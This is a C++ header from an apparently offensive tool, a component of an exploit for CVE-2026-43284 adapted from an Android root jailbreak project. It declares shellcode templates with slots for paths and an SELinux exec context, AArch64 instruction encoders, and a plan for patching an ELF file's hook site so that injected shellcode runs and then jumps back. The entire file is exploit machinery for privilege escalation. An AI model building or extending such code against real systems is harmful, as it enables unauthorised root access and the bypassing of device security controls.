#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_SHELLCODE_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_STEPS_SHELLCODE_HPP

/* CVE-2026-43284 parameterized sentry shellcode and trampoline plan (B5-5).
 *
 * Upstream (DirtyFrag-Android-Root-Jailbreak@de2ab7b usermode/ankit/libcxx.S and
 * lspromise/stage1.S) hard-codes the mutex path, the SELinux exec context, the
 * module and binary paths, and pokes the displaced instruction and the jump
 * back into fixed offsets with raw pointer stores. Here the same blob is a
 * read-only template with declared parameter slots; a caller binds values and
 * gets a fresh, length-checked buffer. Nothing is written to any file: the
 * trampoline is a description the B5-6 page-cache step would later realise.
 *
 * Encoding properties:
 *   - values are written little-endian verbatim; embedded NUL bytes are valid
 *     (there is no NUL-free constraint to satisfy);
 *   - immediates always use a fixed four-word MOVZ/MOVK sequence, so the layout
 *     does not depend on the value;
 *   - the output is zero-padded to kShellcodeAlign and the last word is
 *     reserved for the jump back, matching the upstream trampoline.
 *
 * ADR-0004 R1: this is a backend submodule header and must not include
 * pipeline/. */

#include "backend/cve_2026_43284/steps/elf_hook.hpp"

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace ghostlock::backend::cve_2026_43284::steps {

    inline constexpr std::size_t kShellcodeMaxBytes = 4096U;
    inline constexpr std::size_t kShellcodeAlign = 16U;
    inline constexpr std::size_t kShellcodeMaxSlots = 16U;
    inline constexpr std::uint32_t kAarch64BranchOpcode = 0x14000000U;
    /* Sentinel for ShellcodeTemplate::jump_back_offset: the jump-back word is
     * the last four bytes of the 16-byte-padded image (the original templates
     * all put it there). Upstream libcxx.S is not 16-byte long, so its template
     * names the jump-back word explicitly instead. */
    inline constexpr std::size_t kShellcodeAutoJumpBack =
            static_cast<std::size_t>(-1);

    enum class ShellcodeSlotKind : std::uint8_t {
        Immediate32 = 0U,
        Immediate64 = 1U,
        ByteString = 2U,
        /* Same layout as Immediate32, but the value is an instruction word
         * (the displaced prologue instruction or the jump back). */
        Instruction = 3U,
    };

    struct ShellcodeSlotSpec final {
        std::uint32_t offset = 0U;
        std::uint32_t size = 0U;
        ShellcodeSlotKind kind = ShellcodeSlotKind::Immediate32;
    };

    struct ShellcodeTemplate final {
        const std::uint8_t *bytes = nullptr;
        std::size_t size = 0U;
        const ShellcodeSlotSpec *slots = nullptr;
        std::size_t slot_count = 0U;
        /* Offset of the executable entry inside the blob. Most templates are
         * pure code (0); the upstream libcxx.S blob stores its strings first,
         * so its entry is libcxx_start - libcxx_data. */
        std::size_t entry_offset = 0U;
        /* Offset of the 4-byte jump-back word. kShellcodeAutoJumpBack keeps
         * the original behaviour (the last word of the padded image). */
        std::size_t jump_back_offset = kShellcodeAutoJumpBack;
    };

    struct ShellcodeBinding final {
        std::size_t slot_index = 0U;
        std::uint64_t immediate = 0U;
        std::string_view bytes{};
    };

    enum class ShellcodeError : std::uint8_t {
        None = 0,
        NullTemplate,
        InvalidTemplateSize,
        TooLarge,
        NullSlotTable,
        TooManySlots,
        SlotOutOfBounds,
        SlotOverlap,
        SlotMisaligned,
        SlotBadSize,
        NullOutput,
        OutputTooSmall,
        UnknownSlot,
        DuplicateSlot,
        ValueTooLong,
        BadSlotKind,
        EmptyValue,
    };

    /* Encode template + bindings into out. out_size receives the zero-padded
     * output length (a multiple of kShellcodeAlign). ByteString values must
     * leave at least one byte for the NUL terminator. */
    [[nodiscard]] bool build_shellcode(const ShellcodeTemplate &tmpl,
                                       const ShellcodeBinding *bindings,
                                       std::size_t binding_count, std::uint8_t *out,
                                       std::size_t out_capacity, std::size_t &out_size,
                                       ShellcodeError &error) noexcept;

    /* Materialise value in X<reg> (reg <= 31) as MOVZ/MOVK, four words. */
    [[nodiscard]] bool encode_mov_imm64(std::uint64_t value, std::uint8_t reg,
                                        std::uint32_t out[4]) noexcept;

    /* AArch64 B <label>: opcode 0x14000000 | imm26, imm26 = (to - from) / 4.
     * Both addresses must be 4-byte aligned and within +/-128 MiB. */
    [[nodiscard]] bool encode_branch(std::uint64_t from, std::uint64_t to,
                                     std::uint32_t &out) noexcept;

    /* Trampoline / patch description. Every offset is a file offset; no byte is
     * written by producing this struct. The caller overwrites 4 bytes at
     * hook_file_offset with branch_instruction, places the shellcode at
     * shellcode_file_offset, has it replay displaced_instruction, and the last
     * word is overwritten with jump_back_instruction. */
    struct HookPlan final {
        bool valid = false;
        std::uint64_t hook_file_offset = 0U;
        std::uint64_t hook_vaddr = 0U;
        std::uint64_t shellcode_file_offset = 0U;
        std::uint64_t shellcode_vaddr = 0U;
        std::size_t shellcode_bytes = 0U; /* aligned */
        std::uint32_t branch_instruction = 0U;
        std::uint32_t jump_back_instruction = 0U;
        std::uint32_t displaced_instruction = 0U;
        bool guard_skipped = false;
        std::uint32_t guard_instruction = 0U;
        std::size_t entry_offset = 0U;      /* executable entry within payload */
        std::size_t jump_back_offset = 0U;  /* where jump_back_instruction goes */
        /* Landing room reported by locate_hook_target(); carried here so the
         * staged plan can echo it (B5-9h-2). */
        std::uint64_t payload_max_bytes = 0U;
    };

    enum class HookPlanError : std::uint8_t {
        None = 0,
        InvalidTarget,
        ShellcodeTooSmall,
        ShellcodeMisaligned,
        PayloadNotMapped,
        BranchOutOfRange,
        EntryOutOfRange,
        JumpBackOutOfRange,
    };

    /* entry_offset is the blob entry the hook branch must target; it defaults
     * to 0 (pure-code templates). jump_back_offset defaults to the last word of
     * the padded image; pass the template's explicit offset when the raw blob
     * is not a multiple of kShellcodeAlign (upstream libcxx.S). */
    [[nodiscard]] bool build_hook_plan(const HookTarget &target, std::size_t shellcode_bytes,
                                       HookPlan &out, HookPlanError &error,
                                       std::size_t entry_offset = 0U,
                                       std::size_t jump_back_offset =
                                               kShellcodeAutoJumpBack) noexcept;

} // namespace ghostlock::backend::cve_2026_43284::steps

#endif
